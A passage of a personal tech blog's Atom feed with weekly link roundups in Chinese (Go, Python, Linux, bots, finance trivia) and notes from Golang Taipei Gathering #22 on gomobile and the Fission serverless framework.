&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2017/03/boundary.html"&gt;技术的边界 - 阮一峰的网络日志&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;挺有趣的反思  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://dotblogs.com.tw/hatelove/2017/03/26/why-engineers-should-keep-blogging"&gt;我為什麼鼓勵工程師寫 blog | In 91 - 點部落&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;覺得講這麼長一篇真的好累  &lt;/li&gt;
&lt;li&gt;像我這種拖延症患者看完大概就會覺得太麻煩而不做了  &lt;/li&gt;
&lt;li&gt;個人一直都抱持著寫給之後會忘記這件事情的自己看的想法在寫  &lt;/li&gt;
&lt;li&gt;因為我記不住這麼多東西  &lt;/li&gt;
&lt;li&gt;如果有人剛好因此而受益也很好  &lt;/li&gt;
&lt;li&gt;如果有好的回饋更好  &lt;/li&gt;
&lt;li&gt;僅此而已  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;facebook&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://code.facebook.com/posts/1245186942201788/hardware-analytics-and-lifecycle-optimization-halo-at-facebook/"&gt;Hardware Analytics and Lifecycle Optimization (HALO) at Facebook | Engineering Blog | Facebook Code | Facebook&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Facebook 的 blog 大概是我有追的裡頭最難懂的一個  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gcp&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.gcping.com/"&gt;GCP ping&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;測試自己跟 GCP 不同 region 之間的 latency  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;git&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.louie.lu/2017/03/21/%e5%a6%82%e4%bd%95%e5%af%ab%e4%b8%80%e5%80%8b-git-commit-message/"&gt;如何寫一個 Git Commit Message | louie_lu's blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;2014 年的舊文了  &lt;/li&gt;
&lt;li&gt;但被這位翻成了繁體中文  &lt;/li&gt;
&lt;li&gt;所以還是推一下  &lt;/li&gt;
&lt;li&gt;很值得一看  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Ad Blocker 與 Anti Ad Blocker 們  &lt;ul&gt;
&lt;li&gt;Ad Blocker  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/gorhill/uBlock"&gt;GitHub - gorhill/uBlock: uBlock Origin - An efficient blocker for Chromium and Firefox. Fast and lean.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/reek/anti-adblock-killer"&gt;GitHub - reek/anti-adblock-killer: Anti-Adblock Killer helps you keep your Ad-Blocker active, when you visit a website and it asks you to disable.&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Anti Ad Blocker  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/sitexw/BlockAdBlock"&gt;GitHub - sitexw/BlockAdBlock: Allows you to detect the extension AdBlock (and other)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sitexw/FuckAdBlock"&gt;sitexw/FuckAdBlock: Detects ad blockers (AdBlock, ...)&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;golang&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/fission/fission"&gt;fission/fission: Fast Serverless Functions for Kubernetes&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Fission is a fast serverless framework for Kubernetes with a focus on developer productivity and high performance.  Fission operates on just the code: Docker and Kubernetes are abstracted away under normal operation, though you can use both to extend Fission if you want to.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;GTG 聽到的介紹，可以拿來在 k8s 上做到 Function as a Service，不過目前還不夠成熟，還不太適合拿來用於 production  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/hybridgroup/gobot"&gt;GitHub - hybridgroup/gobot: Golang framework for robotics, drones, and the Internet of Things (IoT)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Gobot (http://gobot.io/) is a framework using the Go programming language (http://golang.org/) for robotics, physical computing, and the Internet of Things.  It provides a simple, yet powerful way to create solutions that incorporate multiple, different hardware devices at the same time.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;一個提供快速打造 IoT device 的 Golang framework  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;google&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://opensource.googleblog.com/"&gt;Google Open Source Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Google 開了一個網站，整理了 Google 和 Open Source 有關的東西。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://thecodist.com/article/the-biggest-difference-between-coding-today-and-when-i-started-in-the-80-s"&gt;The Codist: The Biggest Difference Between Coding Today and When I Started in the 80’s&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;作者出自於親身經驗描述了現在寫程式與三十年前寫程式的差別  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2017/03/disable-pylint-warning-check-2017/"&gt;關掉 Pylint 一些特定 Warning 的檢查 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;有時候真的會想要關閉一些比較嚴格的檢查  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://tzangms.com/dashboard-tool-metabase/"&gt;Dashboard 利器: Metabase&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;花了幾個小時玩 Metabase 就把這張漂亮的 Dashboard 拉了出來, 也沒什麼寫到 SQL, 就把 StreetVoice 的相關營運數據都給攤了出來, 真的是非常棒啊, 雖然內容得再多調整就是了, 這塊我得再多學習。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;好像真的挺不錯的，順便把它介紹給了同事。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://twitter.com/FENGJoy/status/847009349599870976"&gt;V Joy on Twitter: "三件套式可膨胀式植入假体，是男科用于重度ED的三线治疗手段。在伟哥问世前，三件套手术风靡欧美，号称植入幸福，植入自信，其手术切口隐蔽，创伤也比较小。以前医生尝试过植入肋骨、肋软骨、硬性材料，半硬性材料，最后进展到可膨胀性材料。不过需要祈祷术后不要遇到机械故障，导致开关无效，#科普 https://t.co/qngLfow95E"&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;三件套式可膨胀式植入假体，是男科用于重度ED的三线治疗手段。在伟哥问世前，三件套手术风靡欧美，号称植入幸福，植入自信，其手术切口隐蔽，创伤也比较小。以前医生尝试过植入肋骨、肋软骨、硬性材料，半硬性材  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;這是什麼恐怖的東西，光看起來就很痛。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;life&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2017/03/bank-deposit-method-different-2017/"&gt;銀行定存 零存整付、整存整付、存本取息 的差別 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;常常聽到這些名詞都搞不太懂，這篇總算有比較清楚的解釋。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ted.com/talks/emilie_wapnick_why_some_of_us_don_t_have_one_true_calling"&gt;Emilie Wapnick: Why some of us don't have one true calling | TED Talk | TED.com&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;有些人並沒有對某一件事有天賦與絕對的興趣，每件事情做到一定的程度就會開始感到厭煩或無趣，進而開始學習其他事物，常常會被很多人認為是三分鐘熱度。  &lt;/li&gt;
&lt;li&gt;講者自己就是這樣的一個人，但強調這樣的人並不是壞事，因為他們對於未知的事物會比較樂於接受與學習，而且因為常常在學新東西，所以對於學習新東西的方法已經有一定的模式，所以會比別人快還上手，也知道學習的過程一定會遇到失敗，因此而不怕失敗。  &lt;/li&gt;
&lt;li&gt;在團隊合作的時候，這樣的人也可以提供團隊一些比較不一樣的觀點。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zhuanlan.zhihu.com/p/25343518"&gt;用深度学习（DNN）构建推荐系统 - Deep Neural Networks for YouTube Recommendations论文精读 - 知乎专栏&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Youtube 用 DNN 打造推薦系統的論文  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="blog"></category><category term="facebook"></category><category term="gcp"></category><category term="git"></category><category term="github"></category><category term="golang"></category><category term="google"></category><category term="life"></category><category term="misc"></category><category term="programmer"></category><category term="python"></category><category term="trivia"></category><category term="web"></category></entry><entry><title>Golang Taipei Gathering #22</title><link href="https://blog.m157q.tw/posts/2017/03/28/golang-taipei-gathering-22/" rel="alternate"></link><published>2017-03-28T22:39:59+08:00</published><updated>2017-03-28T22:39:59+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-03-28:posts/2017/03/28/golang-taipei-gathering-22/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;Links  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://golang.kktix.cc/events/gtg22"&gt;http://golang.kktix.cc/events/gtg22&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/groups/269001993248363/permalink/817469818401575/"&gt;https://www.facebook.com/groups/269001993248363/permalink/817469818401575/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;19:30~20:10: 陳敬翔 (Sean) - Go 的技能與安裝入門&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Slides  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://go-talks.appspot.com/github.com/Starfine/02.-Go-Present/GTG22.slide#1"&gt;http://go-talks.appspot.com/github.com/Starfine/02.-Go-Present/GTG22.slide#1&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用 Go 開發手機 App  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;gomobile&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;gomobile install golang.org/x/mobile/example/flappy&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用 Chrome 開啟 Android 畫面的瀏覽器套件  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://chrome.google.com/webstore/detail/vysor/gidgenkbbabolejbgbpnhbimgjbffefm"&gt;https://chrome.google.com/webstore/detail/vysor/gidgenkbbabolejbgbpnhbimgjbffefm&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用 Go 開發 Arduino  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://gobot.io"&gt;GoBot&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;學習資源  &lt;ul&gt;
&lt;li&gt;Google 搜尋時，用 &lt;code&gt;golang&lt;/code&gt; 當關鍵字，不要用 &lt;code&gt;go&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/golang/go/wiki/FromXToGo"&gt;https://github.com/golang/go/wiki/FromXToGo&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;常用網站  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://godoc.org/"&gt;GoDoc&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://gowalker.org/"&gt;GoWalker&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://awesome-go.com/"&gt;AwesomeGo&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/avelino/awesome-go"&gt;https://github.com/avelino/awesome-go&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://golanglibs.com/"&gt;GoLangLibs&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;20:20~21:00: VMFive - TA-CHING CHEN - Introduction to Fission&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Slides  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://tachingchen.com/tw/blog/Fission-Introduction/"&gt;https://tachingchen.com/tw/blog/Fission-Introduction/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.slideshare.net/TaChingChen/fission-introduction"&gt;https://www.slideshare.net/TaChingChen/fission-introduction&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/fission/fission"&gt;Fission: Fast Serverless Functions for Kubernetes&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Function as a Service (FaaS)  &lt;ul&gt;
&lt;li&gt;Exmaple  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://aws.amazon.com/lambda/"&gt;AWS Lambda&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/functions/"&gt;Google Cloud Functions&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pros  &lt;ul&gt;
&lt;li&gt;developer focus on code snippets  &lt;/li&gt;
&lt;li&gt;short cold-start  &lt;/li&gt;
&lt;li&gt;horizontal scaling  &lt;/li&gt;
&lt;li&gt;pay as you go (!= cheap)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cons  &lt;ul&gt;
&lt;li&gt;vendor lock-in  &lt;/li&gt;
&lt;li&gt;hard to test  &lt;/li&gt;
&lt;li&gt;environmental limitation  &lt;/li&gt;
&lt;li&gt;limited execution time per request  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Fission  &lt;ul&gt;
&lt;li&gt;支援 Go, Node.js, PHP7, Python3, .NET  &lt;ul&gt;
&lt;li&gt;Go 的部份是以 Go 1.8 plugin 的方式插入，如果要使用 Go 開發的話，記得要把版本升到 1.8  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Live demo example  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;fission fn create --name GTG22 --env nodejs --code hello.js&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;fission route create --method GET --url /hello --function GTG22&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;fission fn edit --name GTG22&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;看 log (講者貢獻的 &lt;a href="https://github.com/fission/fission/pull/131"&gt;PR&lt;/a&gt;，不到一個星期前才剛 merge 進 master branch)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;fission fn logs --name GTG22&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;fission fn logs --name GTG22 -f&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;fission fn logs --name GTG22 -f -d&lt;/code&gt; # 看更詳細的 log (Debug mode)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Architecture  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/fission/fission/blob/master/Documentation/Architecture.md"&gt;https://github.com/fission/fission/blob/master/Documentation/Architecture.md&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;會先開好一堆 generic pods listen，當接到佈署 fuction 的需求時，可以在幾毫秒內就佈署完成，並轉換成 Specific Function Pod.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to contribute  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/fission/fission/blob/master/CONTRIBUTING.md"&gt;https://github.com/fission/fission/blob/master/CONTRIBUTING.md&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;是個去年才開始的專案，所以有很多地方可以貢獻。文件寫的不錯，懂 Go 的話基本上可以很快做出一些貢獻。  &lt;/li&gt;
&lt;li&gt;Repo owner 是位印度人，但英文很好，也很積極的回應，做出貢獻還有可能得到神祕小禮物，例如一件來自美國的 T-shirt 之類的  &lt;/li&gt;
&lt;li&gt;還不是個成熟的專案，還不建議用在 Production。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Conclusion  &lt;ul&gt;
&lt;li&gt;Short cold-start overhead (~100 ms)  &lt;/li&gt;
&lt;li&gt;Suitable for developers want to set up their own FaaS  &lt;/li&gt;
&lt;li&gt;Cutsomized environment image  &lt;/li&gt;
&lt;li&gt;Adjustable execution time  &lt;/li&gt;
&lt;li&gt;Cheaper than FaaS under heavy usage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Lighting Talks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;陳小熊 - Go 新手村冒險筆記  &lt;ul&gt;
&lt;li&gt;Slides: &lt;a href="https://drive.google.com/file/d/0B158iGrlsSveNFVoUUF4ZTlsbVE/view"&gt;https://drive.google.com/file/d/0B158iGrlsSveNFVoUUF4ZTlsbVE/view&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;生動活潑得介紹了 Golang 有哪些學習資源，包括線上課程、推薦書籍、Gopher Con 等等，為入門者提供了一個方向。  &lt;/li&gt;
&lt;li&gt;還 Live Demo 了一個用 Golang 實作出來的線上讀書會平台  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;想想我也是上次 GTG 才決定開始學 Golang 的，結果過了一個月了根本沒啥進展，感到慚愧 QQ  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Golang"></category></entry><entry><title>Y2017W12</title><link href="https://blog.m157q.tw/posts/2017/03/27/y2017w12/" rel="alternate"></link><published>2017-04-22T19:00:51+08:00</published><updated>2017-04-22T19:00:51+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-03-27:posts/2017/03/27/y2017w12/</id><summary type="html">&lt;h3&gt;archlinux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.louie.lu/2017/03/15/%e4%bf%ae%e6%ad%a3-arch-linux-locale-%e7%84%a1%e6%b3%95-generate-%e4%bb%a5%e5%8f%8a-tmux-mosh-%e5%87%ba%e7%8f%be%e9%8c%af%e8%aa%a4/"&gt;修正 Arch Linux locale 無法 generate 以及 tmux mosh 出現錯誤 | louie_lu's blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;忘記把 &lt;code&gt;/etc/locale.gen&lt;/code&gt; 的註解拿掉，我好像也有這樣耍笨過一次。 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://mhperng.blogspot.tw/2017/03/blog-post_8.html"&gt;清大彭明輝的部落格: 日本人還會像二戰時那麼殘忍嗎？&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;被洗腦是關鍵呢  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://breezymove.blogspot.tw/2017/03/distribution-vs-release.html"&gt;Distribution 散佈版 vs Release 發行(版)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;還真沒仔細想過作業系統的版本在這個詞上的差異  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2017/03/gartner-hype-cycle.html"&gt;技术的热门度曲线 - 阮一峰的网络日志&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;分成四期呀  &lt;/li&gt;
&lt;li&gt;科技圈的創業風向好像可以直接套用這張圖呢  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://jacky.seezone.net/2017/03/20/8671/"&gt;2016開卷記錄 › 網絡暴民 Jacky's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;好猛  &lt;/li&gt;
&lt;li&gt;56 本  &lt;/li&gt;
&lt;li&gt;而且每本應該都有很詳細的讀書心得…  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.byvoid.com/zht/blog/micronesia-pohnpei-2"&gt;波納佩島意外之旅（二） - BYVoid&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;小島遊記真的好有趣呀  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;c&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/mcinglis/c-style"&gt;mcinglis/c-style: My favorite C programming practices.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;These are my favorite C programming practices. Some rules are as trivial as style, while others are more intricate. I follow a few rules religiously, and others I use as a guideline.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;看 jserv 的直播看到的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://lucumr.pocoo.org/2013/8/18/beautiful-native-libraries/"&gt;Beautiful Native Libraries | Armin Ronacher's Thoughts and Writings&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;I'm obsessed with nice APIs. Not just APIs however, also in making the overall experience of using a library as good as possible.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;看 jserv 的直播看到的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;facebook&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://chatbotsmagazine.com/5-tips-messenger-bot-devs-need-to-know-41673173f7c0"&gt;5 Tips Messenger Bot Devs Need to Know&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;最近都在弄 Facebook Messenger Bot，這篇算是看到以後覺得比較有用的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/spchuang/fb-local-chat-bot"&gt;GitHub - spchuang/fb-local-chat-bot: Simple Node client for Messenger Bot designed for easy local testing&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Testing your Messenger Bot apps is a pain in the ass - you need to setup ngrok to tunnel to your server (what happens when multiple people work on it?) and writing unit tests are not intuitive.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;的確沒有 local messenger bot client 可以測試真的挺麻煩的，不過這個我認真看了一下還是不太知道怎麼架就是。而且 Messenger Bot 版本變動很快，這個看起來沒一起更新的這麼快。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.worldplay.com.tw/2017/02/19/stacer/"&gt;Stacer – 漂亮的系統優化器，比htop還美 – MONISAN'S WORLD&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;好像不錯  &lt;/li&gt;
&lt;li&gt;有空裝來用用看好了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://jvns.ca/blog/2017/03/19/getting-started-with-ftrace/"&gt;ftrace: trace your kernel functions! - Julia Evans&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;關於 &lt;code&gt;ftrace&lt;/code&gt; 的介紹，挺不錯。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://farseerfc.me/pacvis.html"&gt;PacVis: 可視化 pacman 本地數據庫 - Farseerfc的小窩&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;酷耶，把 pacman 套件的相依性視覺化。  &lt;/li&gt;
&lt;li&gt;後來才突然想起來以前好像就有看過，只是沒記起來。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;math&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2017/03/04/7165/%e8%a8%88%e7%ae%97%e5%9c%93%e5%91%a8%e7%8e%87-pi-%e7%9a%84%e5%85%ac%e5%bc%8f/"&gt;計算圓周率 Pi 的公式... | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://twitter.com/pickover/status/837782789286166530"&gt;https://twitter.com/pickover/status/837782789286166530&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;沒想到公式這麼漂亮  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://morepypy.blogspot.tw/2017/03/pypy27-and-pypy35-v57-two-in-one-release.html"&gt;PyPy Status Blog: PyPy2.7 and PyPy3.5 v5.7 - two in one release&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2017/03/19/7201/%e7%94%a8%e7%a8%8b%e5%bc%8f%e8%87%aa%e5%8b%95%e5%90%8c%e6%ad%a5%e5%ad%97%e5%b9%95%e8%88%87%e8%81%b2%e9%9f%b3/"&gt;用程式自動同步字幕與聲音 | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;每個人都說字幕組以後上字幕不用這麼辛苦對字幕了。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/readbeyond/aeneas"&gt;GitHub - readbeyond/aeneas: aeneas is a Python/C library and a set of tools to automagically synchronize audio and text (aka forced alignment)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;aeneas automatically generates a synchronization map between a list of text fragments and an audio file containing the narration of the text. In computer science this task is known as (automatically computing a) forced alignment.  aeneas has been developed and tested on Debian 64bit, with Python 2.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/hungys/RamboBoxGen"&gt;GitHub - hungys/RamboBoxGen: A utility for generating Rambo-style Box Score for NBA games, with ANSI color highlighting optimized for Ptt BBS.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;抓 NBA 的資料生成專門給給批踢踢 NBA 板看的資訊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://drive.google.com/file/d/0B3BrI77ApwxWTUZJWkhIOEE5bzQ/view"&gt;[iThomeTechTalk] 170322從入門到差點入獄@虎虎 v3.2.pdf - Google 雲端硬碟&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是滿基本常見的資安常識  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://jmperezperez.com/medium-image-progressive-loading-placeholder/"&gt;How Medium does progressive image loading - JMPerez Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
